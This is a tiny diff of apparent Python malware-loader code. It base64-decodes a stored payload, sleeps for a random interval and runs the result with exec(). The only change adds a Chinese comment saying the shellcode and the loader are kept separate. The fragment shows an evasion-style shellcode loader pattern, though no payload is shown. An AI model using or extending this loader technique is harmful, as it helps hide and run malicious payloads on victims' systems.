@@ -65,4 +65,4 @@ for i in range(random_int):
     moon_load=base64.b64decode(load)
 time.sleep(random_int*0.1)
 moon_start=moon_load
-exec(moon_start)
+exec(moon_start)  # 分离的是shellcode和loader
